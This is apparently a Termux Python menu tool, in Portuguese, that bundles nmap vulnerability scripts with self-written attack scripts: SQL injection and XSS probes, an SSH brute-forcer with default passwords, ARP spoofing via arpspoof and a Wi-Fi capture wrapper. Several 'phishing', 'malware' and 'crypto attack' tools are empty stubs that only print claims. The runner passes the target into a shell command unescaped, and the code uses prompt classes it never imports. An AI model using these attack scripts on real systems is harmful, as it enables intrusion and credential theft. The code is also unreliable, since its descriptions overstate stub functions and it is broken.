#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import subprocess
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.live import Live
from rich.align import Align

console = Console()

class AdvancedNmapScanner:
    def __init__(self):
        self.nmap_scripts = self.load_nmap_scripts()
        self.custom_scripts = self.create_custom_scripts()
        self.all_scripts = {**self.nmap_scripts, **self.custom_scripts}
        self.scan_results = {}
        self.script_files_created = False
        
    def load_nmap_scripts(self):
        """Carrega 40 scripts populares do Nmap"""
        return {
            # Vulnerabilities (15 scripts)
            "vuln": {
                "name": "Nmap Vulnerability Scan",
                "description": "Varredura geral de vulnerabilidades",
                "command": "nmap -sV --script vuln {target}",
                "category": "Vulnerability",
                "risk": "High"
            },
            "http-vuln-*": {
                "name": "HTTP Vulnerability Checks",
                "description": "Verifica vulnerabilidades HTTP comuns",
                "command": "nmap -sV --script http-vuln-* {target}",
                "category": "Web",
                "risk": "High"
            },
            "smb-vuln-*": {
                "name": "SMB Vulnerability Checks",
                "description": "Verifica vulnerabilidades SMB (EternalBlue, etc)",
                "command": "nmap -sV --script smb-vuln-* {target}",
                "category": "Windows",
                "risk": "Critical"
            },
            "ssl-heartbleed": {
                "name": "Heartbleed Vulnerability Check",
                "description": "Testa para vulnerabilidade Heartbleed em SSL",
                "command": "nmap -sV --script ssl-heartbleed {target}",
                "category": "SSL",
                "risk": "High"
            },
            "ftp-vuln-*": {
                "name": "FTP Vulnerability Checks",
                "description": "Verifica vulnerabilidades FTP",
                "command": "nmap --script ftp-vuln-* {target}",
                "category": "FTP",
                "risk": "Medium"
            },
            "smtp-vuln-*": {
                "name": "SMTP Vulnerability Checks",
                "description": "Verifica vulnerabilidades SMTP",
                "command": "nmap --script smtp-vuln-* {target}",
                "category": "Email",
                "risk": "Medium"
            },
            "dns-zone-transfer": {
                "name": "DNS Zone Transfer",
                "description": "Tenta transferência de zona DNS",
                "command": "nmap --script dns-zone-transfer {target}",
                "category": "DNS",
                "risk": "Medium"
            },
            "http-csrf": {
                "name": "CSRF Vulnerability Check",
                "description": "Verifica vulnerabilidades CSRF",
                "command": "nmap --script http-csrf {target}",
                "category": "Web",
                "risk": "Medium"
            },
            "http-sql-injection": {
                "name": "SQL Injection Check",
                "description": "Verifica vulnerabilidades SQL Injection",
                "command": "nmap --script http-sql-injection {target}",
                "category": "Web",
                "risk": "High"
            },
            "http-xssed": {
                "name": "XSS Vulnerability Check",
                "description": "Verifica vulnerabilidades XSS",
                "command": "nmap --script http-xssed {target}",
                "category": "Web",
                "risk": "High"
            },
            "rdp-vuln-ms12-020": {
                "name": "MS12-020 RDP Vulnerability",
                "description": "Verifica vulnerabilidade MS12-020 no RDP",
                "command": "nmap --script rdp-vuln-ms12-020 {target}",
                "category": "Windows",
                "risk": "Critical"
            },
            "smb-check-vulns": {
                "name": "SMB Vulnerability Check",
                "description": "Verifica múltiplas vulnerabilidades SMB",
                "command": "nmap --script smb-check-vulns {target}",
                "category": "Windows",
                "risk": "Critical"
            },
            "sshv1": {
                "name": "SSH Protocol Version 1",
                "description": "Verifica se SSH aceita versão 1 insegura",
                "command": "nmap --script sshv1 {target}",
                "category": "SSH",
                "risk": "High"
            },
            "telnet-encryption": {
                "name": "Telnet Encryption Check",
                "description": "Verifica se Telnet usa encryption",
                "command": "nmap --script telnet-encryption {target}",
                "category": "Telnet",
                "risk": "High"
            },
            "vmware-version": {
                "name": "VMware Version Detection",
                "description": "Detecta versão do VMware e vulnerabilidades",
                "command": "nmap --script vmware-version {target}",
                "category": "Virtualization",
                "risk": "Medium"
            },

            # Enumeration (10 scripts)
            "http-enum": {
                "name": "HTTP Enumeration",
                "description": "Enumera diretórios e arquivos web",
                "command": "nmap --script http-enum {target}",
                "category": "Web",
                "risk": "Low"
            },
            "smb-enum-shares": {
                "name": "SMB Share Enumeration",
                "description": "Enumera compartilhamentos SMB",
                "command": "nmap --script smb-enum-shares {target}",
                "category": "Windows",
                "risk": "Medium"
            },
            "snmp-interfaces": {
                "name": "SNMP Interface Enumeration",
                "description": "Enumera interfaces via SNMP",
                "command": "nmap -sU --script snmp-interfaces {target}",
                "category": "SNMP",
                "risk": "Medium"
            },
            "dns-brute": {
                "name": "DNS Brute Force",
                "description": "Brute force de subdomínios DNS",
                "command": "nmap --script dns-brute {target}",
                "category": "DNS",
                "risk": "Medium"
            },
            "ftp-anon": {
                "name": "FTP Anonymous Login",
                "description": "Verifica login anônimo FTP",
                "command": "nmap --script ftp-anon {target}",
                "category": "FTP",
                "risk": "Medium"
            },
            "mysql-enum": {
                "name": "MySQL Enumeration",
                "description": "Enumera informações do MySQL",
                "command": "nmap --script mysql-enum {target}",
                "category": "Database",
                "risk": "Medium"
            },
            "ms-sql-info": {
                "name": "MS-SQL Information",
                "description": "Obtém informações do MS-SQL Server",
                "command": "nmap --script ms-sql-info {target}",
                "category": "Database",
                "risk": "Medium"
            },
            "vulners": {
                "name": "Vulnerability Scanner",
                "description": "Scan de vulnerabilidades usando vulners.com",
                "command": "nmap -sV --script vulners {target}",
                "category": "Vulnerability",
                "risk": "High"
            },
            "broadcast-netbios-master-browser": {
                "name": "NetBIOS Master Browser",
                "description": "Descobre master browsers NetBIOS",
                "command": "nmap --script broadcast-netbios-master-browser",
                "category": "Network",
                "risk": "Low"
            },
            "targets-sniffer": {
                "name": "Network Sniffer",
                "description": "Captura e analisa tráfego de rede",
                "command": "nmap --script targets-sniffer {interface}",
                "category": "Network",
                "risk": "Medium"
            },

            # Exploitation (5 scripts)
            "http-shellshock": {
                "name": "Shellshock Exploit Check",
                "description": "Testa para vulnerabilidade Shellshock",
                "command": "nmap -sV --script http-shellshock {target}",
                "category": "Web",
                "risk": "High"
            },
            "smb-double-pulsar-backdoor": {
                "name": "DoublePulsar Backdoor Check",
                "description": "Verifica backdoor DoublePulsar",
                "command": "nmap --script smb-double-pulsar-backdoor {target}",
                "category": "Windows",
                "risk": "Critical"
            },
            "http-passwd": {
                "name": "HTTP Password File Access",
                "description": "Tenta acessar arquivos de password via HTTP",
                "command": "nmap --script http-passwd {target}",
                "category": "Web",
                "risk": "High"
            },
            "redis-info": {
                "name": "Redis Information Disclosure",
                "description": "Obtém informações do Redis",
                "command": "nmap --script redis-info {target}",
                "category": "Database",
                "risk": "High"
            },
            "mongodb-info": {
                "name": "MongoDB Information Disclosure",
                "description": "Obtém informações do MongoDB",
                "command": "nmap --script mongodb-info {target}",
                "category": "Database",
                "risk": "High"
            },

            # Discovery (10 scripts)
            "banner": {
                "name": "Banner Grabbing",
                "description": "Coleta banners de serviços",
                "command": "nmap -sV --script banner {target}",
                "category": "Discovery",
                "risk": "Low"
            },
            "ssl-cert": {
                "name": "SSL Certificate Info",
                "description": "Obtém informações de certificados SSL",
                "command": "nmap --script ssl-cert {target}",
                "category": "SSL",
                "risk": "Low"
            },
            "ssh-hostkey": {
                "name": "SSH Host Key",
                "description": "Obtém chaves host SSH",
                "command": "nmap --script ssh-hostkey {target}",
                "category": "SSH",
                "risk": "Low"
            },
            "http-title": {
                "name": "HTTP Title",
                "description": "Obtém título de páginas web",
                "command": "nmap --script http-title {target}",
                "category": "Web",
                "risk": "Low"
            },
            "http-headers": {
                "name": "HTTP Headers",
                "description": "Obtém headers HTTP",
                "command": "nmap --script http-headers {target}",
                "category": "Web",
                "risk": "Low"
            },
            "ip-geolocation-*": {
                "name": "IP Geolocation",
                "description": "Obtém geolocalização por IP",
                "command": "nmap --script ip-geolocation-* {target}",
                "category": "Recon",
                "risk": "Low"
            },
            "whois-*": {
                "name": "WHOIS Lookup",
                "description": "Consulta informações WHOIS",
                "command": "nmap --script whois-* {target}",
                "category": "Recon",
                "risk": "Low"
            },
            "path-mtu": {
                "name": "Path MTU Discovery",
                "description": "Descobre MTU do caminho",
                "command": "nmap --script path-mtu {target}",
                "category": "Network",
                "risk": "Low"
            },
            "traceroute-geolocation": {
                "name": "Traceroute Geolocation",
                "description": "Geolocalização de traceroute",
                "command": "nmap --script traceroute-geolocation {target}",
                "category": "Network",
                "risk": "Low"
            },
            "targets-*": {
                "name": "Target Discovery",
                "description": "Descoberta de targets na rede",
                "command": "nmap --script targets-* {target}",
                "category": "Discovery",
                "risk": "Low"
            }
        }
    
    def create_custom_scripts(self):
        """Cria 10 scripts personalizados perigosos"""
        return {
            "custom-web-exploit": {
                "name": "Web Exploit Framework",
                "description": "Framework avançado para exploração web (SQLi, XSS, RCE)",
                "command": "python3 custom_scripts/web_exploit.py {target}",
                "category": "Exploit",
                "risk": "Critical",
                "file_content": """#!/usr/bin/env python3
import requests
import sys
import threading
from urllib.parse import urljoin

def test_sql_injection(target):
    print(f"[+] Testando SQL Injection em {target}")
    # Implementação de testes SQLi
    test_urls = [
        f"http://{target}/index.php?id=1'",
        f"http://{target}/login.php?user=admin'--"
    ]
    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[VULNERABLE] Possível SQLi em: {url}")
        except:
            continue

def test_xss(target):
    print(f"[+] Testando XSS em {target}")
    # Implementação de testes XSS
    test_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert('XSS')>"]
    test_urls = [
        f"http://{target}/search?q=PAYLOAD",
        f"http://{target}/contact?name=PAYLOAD"
    ]
    
    for url in test_urls:
        for payload in test_payloads:
            test_url = url.replace("PAYLOAD", requests.utils.quote(payload))
            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text:
                    print(f"[VULNERABLE] Possível XSS em: {test_url}")
            except:
                continue

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 web_exploit.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Iniciando exploração web em {target}")
    
    test_sql_injection(target)
    test_xss(target)
"""
            },
            
            "custom-bruteforce": {
                "name": "Advanced Bruteforce Suite",
                "description": "Suite completa de bruteforce (SSH, FTP, RDP, etc)",
                "command": "python3 custom_scripts/bruteforce_suite.py {target}",
                "category": "Bruteforce",
                "risk": "High",
                "file_content": """#!/usr/bin/env python3
import paramiko
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

def ssh_bruteforce(target, username_list, password_list):
    print(f"[+] Iniciando bruteforce SSH em {target}")
    for username in username_list:
        for password in password_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password, timeout=5)
                print(f"[SUCCESS] SSH: {username}:{password}")
                ssh.close()
                return
            except:
                continue

def ftp_bruteforce(target, username_list, password_list):
    print(f"[+] Iniciando bruteforce FTP em {target}")
    # Implementação FTP bruteforce
    pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 bruteforce_suite.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Iniciando bruteforce suite em {target}")
    
    common_usernames = ["admin", "root", "user", "test", "administrator"]
    common_passwords = ["admin", "123456", "password", "root", "test", "12345"]
    
    ssh_bruteforce(target, common_usernames, common_passwords)
    ftp_bruteforce(target, common_usernames, common_passwords)
"""
            },
            
            "custom-network-hijack": {
                "name": "Network Hijacking Toolkit",
                "description": "Ferramentas para hijacking de rede (ARP spoofing, DNS poisoning)",
                "command": "sudo python3 custom_scripts/network_hijack.py {target}",
                "category": "Network",
                "risk": "Critical",
                "file_content": """#!/usr/bin/env python3
import os
import sys
import time

def arp_spoof(target_ip, gateway_ip):
    print(f"[+] Iniciando ARP spoofing entre {target_ip} e {gateway_ip}")
    os.system(f"arpspoof -i eth0 -t {target_ip} {gateway_ip}")
    os.system(f"arpspoof -i eth0 -t {gateway_ip} {target_ip}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 network_hijack.py <target_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = "192.168.1.1"
    
    print(f"[*] Iniciando ataques de hijacking em {target_ip}")
    arp_spoof(target_ip, gateway_ip)
"""
            },
            
            "custom-mobile-exploit": {
                "name": "Mobile Device Exploitation",
                "description": "Exploração de dispositivos móveis (Android/iOS)",
                "command": "python3 custom_scripts/mobile_exploit.py {target}",
                "category": "Mobile",
                "risk": "High",
                "file_content": """#!/usr/bin/env python3
import requests
import sys

def check_android_debug(target):
    print(f"[+] Verificando Android Debug Bridge em {target}:5555")
    try:
        response = requests.get(f"http://{target}:5555", timeout=5)
        if "Android" in response.text:
            print(f"[VULNERABLE] ADB exposto em {target}:5555")
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 mobile_exploit.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    check_android_debug(target)
"""
            },
            
            "custom-wifi-pentest": {
                "name": "WiFi Penetration Toolkit",
                "description": "Ferramentas completas para pentest WiFi",
                "command": "sudo python3 custom_scripts/wifi_pentest.py {interface}",
                "category": "Wireless",
                "risk": "High",
                "file_content": """#!/usr/bin/env python3
import os
import sys

def wifi_scan(interface):
    print(f"[+] Escaneando redes WiFi com interface {interface}")
    os.system(f"airodump-ng {interface}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 wifi_pentest.py <interface>")
        sys.exit(1)
    
    interface = sys.argv[1]
    wifi_scan(interface)
"""
            },
            
            "custom-social-engineer": {
                "name": "Social Engineering Toolkit",
                "description": "Ferramentas de engenharia social avançada",
                "command": "python3 custom_scripts/social_engineer.py",
                "category": "Social",
                "risk": "Medium",
                "file_content": """#!/usr/bin/env python3
print("[+] Social Engineering Toolkit")
print("[+] Gerando payloads de phishing...")
print("[+] Criando websites falsos...")
print("[+] Preparando campanhas de email...")
"""
            },
            
            "custom-malware-analysis": {
                "name": "Malware Analysis Suite",
                "description": "Suite para análise e criação de malware",
                "command": "python3 custom_scripts/malware_analysis.py {file}",
                "category": "Malware",
                "risk": "Critical",
                "file_content": """#!/usr/bin/env python3
import sys
print("[+] Analisando arquivo suspeito...")
print("[+] Extraindo IOCs...")
print("[+] Analisando comportamento...")
"""
            },
            
            "custom-osint-framework": {
                "name": "OSINT Framework",
                "description": "Framework completo de Intelligence",
                "command": "python3 custom_scripts/osint_framework.py {target}",
                "category": "OSINT",
                "risk": "Low",
                "file_content": """#!/usr/bin/env python3
import requests
import sys

def osint_scan(target):
    print(f"[+] Coletando informações OSINT para {target}")
    # Implementação OSINT
    pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 osint_framework.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    osint_scan(target)
"""
            },
            
            "custom-crypto-attack": {
                "name": "Cryptographic Attack Tools",
                "description": "Ferramentas para ataques criptográficos",
                "command": "python3 custom_scripts/crypto_attack.py {target}",
                "category": "Crypto",
                "risk": "High",
                "file_content": """#!/usr/bin/env python3
import sys
print("[+] Iniciando ataques criptográficos...")
print("[+] Testando vulnerabilidades SSL/TLS...")
print("[+] Quebrando hashes fracos...")
"""
            },
            
            "custom-reverse-engineering": {
                "name": "Reverse Engineering Suite",
                "description": "Suite para engenharia reversa de software",
                "command": "python3 custom_scripts/reverse_engineering.py {file}",
                "category": "Reversing",
                "risk": "High",
                "file_content": """#!/usr/bin/env python3
import sys
print("[+] Iniciando análise de engenharia reversa...")
print("[+] Desassemblando código...")
print("[+] Analisando vulnerabilidades...")
"""
            }
        }
    
    def create_custom_script_files(self):
        """Cria os arquivos dos scripts personalizados"""
        if self.script_files_created:
            return True
            
        try:
            os.makedirs("custom_scripts", exist_ok=True)
            
            for script_id, script_info in self.custom_scripts.items():
                if "file_content" in script_info:
                    filename = f"custom_scripts/{script_id.replace('custom-', '')}.py"
                    with open(filename, "w") as f:
                        f.write(script_info["file_content"])
                    # Torna o arquivo executável
                    os.chmod(filename, 0o755)
            
            self.script_files_created = True
            console.print("[green]✅ Scripts personalizados criados com sucesso![/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]❌ Erro ao criar scripts: {e}[/red]")
            return False
    
    def run_script(self, script_id, target):
        """Executa um script específico"""
        if script_id not in self.all_scripts:
            console.print(f"[red]❌ Script {script_id} não encontrado[/red]")
            return False
        
        script = self.all_scripts[script_id]
        command = script["command"].replace("{target}", target)
        
        console.print(Panel.fit(
            f"[bold]🚀 Executando Script: {script['name']}[/bold]\n\n"
            f"📝 Descrição: {script['description']}\n"
            f"🔧 Comando: {command}\n"
            f"⚠️  Risco: {script['risk']}\n"
            f"📂 Categoria: {script['category']}",
            border_style="yellow"
        ))
        
        if not Confirm.ask("[yellow]?[/yellow] Deseja executar este script?"):
            return False
        
        try:
            # Executa o comando
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
            
            console.print(Panel.fit(
                f"[bold]📋 RESULTADOS DO SCRIPT[/bold]\n\n"
                f"✅ Exit Code: {result.returncode}\n"
                f"📊 Saída:\n{result.stdout[-1000:]}\n\n"
                f"❌ Erros (se houver):\n{result.stderr[-500:]}",
                border_style="green" if result.returncode == 0 else "red"
            ))
            
            return True
            
        except subprocess.TimeoutExpired:
            console.print("[red]❌ Script excedeu o tempo limite[/red]")
            return False
        except Exception as e:
            console.print(f"[red]❌ Erro ao executar script: {e}[/red]")
            return False
    
    def search_scripts(self, query):
        """Procura scripts por nome, descrição ou categoria"""
        results = {}
        query = query.lower()
        
        for script_id, script_info in self.all_scripts.items():
            if (query in script_id.lower() or 
                query in script_info["name"].lower() or 
                query in script_info["description"].lower() or
                query in script_info["category"].lower()):
                results[script_id] = script_info
        
        return results
    
    def show_script_categories(self):
        """Mostra scripts por categoria"""
        categories = {}
        for script_id, script_info in self.all_scripts.items():
            category = script_info["category"]
            if category not in categories:
                categories[category] = []
            categories[category].append((script_id, script_info))
        
        return categories

class NmapScannerPanel:
    def __init__(self):
        self.scanner = AdvancedNmapScanner()
        self.banner = """
[bold red]
    ╔╗╔┌─┐┬  ┌─┐  ╔═╗┌─┐┌─┐┌┬┐┌─┐┌─┐  ╔═╗┌─┐┌─┐┌┬┐┌─┐┌─┐
    ║║║├┤ │  ├┤   ║ ╦│ │├─┘ ││├┤ └─┐  ║ ╦├┤ ├─┤│││├┤ └─┐
    ╝╚╝└─┘┴─┘└─┘  ╚═╝└─┘┴  ─┴┘└─┘└─┘  ╚═╝└─┘┴ ┴┴ ┴└─┘└─┘
[/bold red]
[bold white on red]        SCANNER AVANÇADO - 40 SCRIPTS NMAP + 10 PERSONALIZADOS[/bold white on red]
"""
    
    def show_menu(self):
        """Menu principal"""
        # Cria os scripts personalizados primeiro
        self.scanner.create_custom_script_files()
        
        while True:
            console.clear()
            console.print(self.banner)
            
            table = Table(
                title="[bold cyan]🎭 MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("Opção", style="cyan", width=10)
            table.add_column("Descrição", style="green")
            table.add_column("Status", style="yellow")
            
            table.add_row("1", "Listar Todos os Scripts", "📋")
            table.add_row("2", "Procurar Script", "🔍")
            table.add_row("3", "Scripts por Categoria", "📂")
            table.add_row("4", "Executar Script", "🚀")
            table.add_row("5", "Scripts Nmap (40)", "🔧")
            table.add_row("6", "Scripts Personalizados (10)", "💀")
            table.add_row("0", "Sair", "🚪")
            
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5", "6"],
                show_choices=False
            )
            
            if choice == "1":
                self.list_all_scripts()
            elif choice == "2":
                self.search_script()
            elif choice == "3":
                self.show_by_category()
            elif choice == "4":
                self.execute_script()
            elif choice == "5":
                self.show_nmap_scripts()
            elif choice == "6":
                self.show_custom_scripts()
            elif choice == "0":
                self.exit_program()
    
    def list_all_scripts(self):
        """Lista todos os scripts disponíveis"""
        console.print(Panel.fit(
            "[bold]📋 TODOS OS SCRIPTS DISPONÍVEIS[/bold]",
            border_style="blue"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Nome", style="green")
        table.add_column("Categoria", style="yellow")
        table.add_column("Risco", style="red")
        table.add_column("Descrição", style="white")
        
        for script_id, script_info in self.scanner.all_scripts.items():
            risk_color = {
                "Critical": "red",
                "High": "bright_red", 
                "Medium": "yellow",
                "Low": "green"
            }
            
            table.add_row(
                script_id,
                script_info["name"],
                script_info["category"],
                f"[{risk_color[script_info['risk']]}]{script_info['risk']}[/{risk_color[script_info['risk']]}]",
                script_info["description"][:50] + "..." if len(script_info["description"]) > 50 else script_info["description"]
            )
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def search_script(self):
        """Procura por scripts"""
        console.print(Panel.fit(
            "[bold]🔍 PROCURAR SCRIPTS[/bold]",
            border_style="blue"
        ))
        
        query = Prompt.ask(
            "[yellow]?[/yellow] Digite o termo de busca"
        )
        
        results = self.scanner.search_scripts(query)
        
        if not results:
            console.print("[yellow]⚠️  Nenhum script encontrado[/yellow]")
            input("\nPressione Enter para voltar...")
            return
        
        console.print(Panel.fit(
            f"[green]✅ {len(results)} scripts encontrados[/green]",
            border_style="green"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Nome", style="green")
        table.add_column("Categoria", style="yellow")
        table.add_column("Risco", style="red")
        
        for script_id, script_info in results.items():
            risk_color = {
                "Critical": "red",
                "High": "bright_red", 
                "Medium": "yellow",
                "Low": "green"
            }
            
            table.add_row(
                script_id,
                script_info["name"],
                script_info["category"],
                f"[{risk_color[script_info['risk']]}]{script_info['risk']}[/{risk_color[script_info['risk']]}]"
            )
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def show_by_category(self):
        """Mostra scripts por categoria"""
        console.print(Panel.fit(
            "[bold]📂 SCRIPTS POR CATEGORIA[/bold]",
            border_style="blue"
        ))
        
        categories = self.scanner.show_script_categories()
        
        for category, scripts in categories.items():
            console.print(Panel.fit(
                f"[bold]{category.upper()}[/bold] - {len(scripts)} scripts",
                border_style="yellow"
            ))
            
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("ID", style="cyan")
            table.add_column("Nome", style="green")
            table.add_column("Risco", style="red")
            
            for script_id, script_info in scripts:
                risk_color = {
                    "Critical": "red",
                    "High": "bright_red", 
                    "Medium": "yellow",
                    "Low": "green"
                }
                
                table.add_row(
                    script_id,
                    script_info["name"],
                    f"[{risk_color[script_info['risk']]}]{script_info['risk']}[/{risk_color[script_info['risk']]}]"
                )
            
            console.print(table)
            print()
        
        input("\nPressione Enter para voltar...")
    
    def execute_script(self):
        """Executa um script específico"""
        console.print(Panel.fit(
            "[bold]🚀 EXECUTAR SCRIPT[/bold]",
            border_style="blue"
        ))
        
        script_id = Prompt.ask(
            "[yellow]?[/yellow] Digite o ID do script"
        )
        
        if script_id not in self.scanner.all_scripts:
            console.print("[red]❌ Script não encontrado[/red]")
            input("\nPressione Enter para voltar...")
            return
        
        target = Prompt.ask(
            "[yellow]?[/yellow] Digite o target (IP, URL, etc)"
        )
        
        self.scanner.run_script(script_id, target)
        input("\nPressione Enter para voltar...")
    
    def show_nmap_scripts(self):
        """Mostra apenas scripts do Nmap"""
        console.print(Panel.fit(
            "[bold]🔧 SCRIPTS DO NMAP (40)[/bold]",
            border_style="blue"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Nome", style="green")
        table.add_column("Categoria", style="yellow")
        table.add_column("Risco", style="red")
        
        for script_id, script_info in self.scanner.nmap_scripts.items():
            risk_color = {
                "Critical": "red",
                "High": "bright_red", 
                "Medium": "yellow",
                "Low": "green"
            }
            
            table.add_row(
                script_id,
                script_info["name"],
                script_info["category"],
                f"[{risk_color[script_info['risk']]}]{script_info['risk']}[/{risk_color[script_info['risk']]}]"
            )
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def show_custom_scripts(self):
        """Mostra apenas scripts personalizados"""
        console.print(Panel.fit(
            "[bold]💀 SCRIPTS PERSONALIZADOS (10)[/bold]",
            border_style="blue"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Nome", style="green")
        table.add_column("Categoria", style="yellow")
        table.add_column("Risco", style="red")
        table.add_column("Descrição", style="white")
        
        for script_id, script_info in self.scanner.custom_scripts.items():
            risk_color = {
                "Critical": "red",
                "High": "bright_red", 
                "Medium": "yellow",
                "Low": "green"
            }
            
            table.add_row(
                script_id,
                script_info["name"],
                script_info["category"],
                f"[{risk_color[script_info['risk']]}]{script_info['risk']}[/{risk_color[script_info['risk']]}]",
                script_info["description"][:50] + "..." if len(script_info["description"]) > 50 else script_info["description"]
            )
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def exit_program(self):
        """Sai do programa"""
        console.print(Panel.fit(
            "[blink bold red]⚠️ AVISO: USO ILEGAL É CRIME! ⚠️[/blink bold red]\n\n"
            "Estes scripts são apenas para:\n"
            "• Testes de penetração autorizados\n"
            "• Pesquisa de segurança\n"
            "• Educação em cybersecurity",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        # Verifica se o nmap está instalado
        try:
            subprocess.run(['nmap', '--version'], capture_output=True, check=True)
        except:
            console.print("[red]❌ Nmap não encontrado. Instale com: pkg install nmap[/red]")
            sys.exit(1)
        
        panel = NmapScannerPanel()
        panel.show_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
